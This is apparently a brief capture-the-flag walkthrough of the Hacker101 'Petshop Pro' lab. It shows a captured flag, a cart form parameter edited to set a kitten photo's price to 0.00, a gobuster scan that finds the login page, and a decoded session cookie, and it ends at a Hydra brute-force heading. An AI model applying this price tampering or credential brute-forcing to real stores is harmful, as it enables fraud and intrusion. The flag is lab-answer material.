# Petshop Pro


> ^FLAG^9d7fa75997dc1d5bd17fbd5fde7e8b6e7a559582cc6d122fbb300c138dd3ddf9$FLAG$ [0]
> 
> 


---


GET /add/0 HTTP/2
Host: 124e8ef093d261d2c39b9fca373cb7f4.ctf.hacker101.com
Cookie: session=eyJjYXJ0IjpbXX0.ZGrpfw.gjLwMk8UqLMFQWVEa-v9Wauu7PI

---

**Changing payment so we pay 0 dollar**

cart=%5B%5B0%2C+%7B%22name%22%3A+%22Kitten%22%2C+%22desc%22%3A+%228%5C%22x10%5C%22+color+glossy+photograph+of+a+kitten.%22%2C+%22logo%22%3A+%22kitten.jpg%22%2C+%22price%22%3A+8.95%7D%5D%5D


cart=%5B%5B0%2C+%7B%22name%22%3A+%22Kitten%22%2C+%22desc%22%3A+%228%5C%22x10%5C%22+color+glossy+photograph+of+a+kitten.%22%2C+%22logo%22%3A+%22kitten.jpg%22%2C+%22price%22%3A+0.00%7D%5D%5D

---

**Finding login page through subdomains iteration with gobuster**

>>> gobuster -u https://124e8ef093d261d2c39b9fca373cb7f4.ctf.hacker101.com/ -t 40 -w /usr/share/wordlists/common.txt
>>> https://124e8ef093d261d2c39b9fca373cb7f4.ctf.hacker101.com

> /cart
> /login


> eyJjYXJ0IjpbMCwxXSwibW9kaWZpZWQiOnRydWV9.ZGrtBA.1Bwm8TooKTWxQybCA3XCJq-AZ78
> {"cart":[0,1],"modified":true}

---

**Brute-forcing username/password with Hydra**


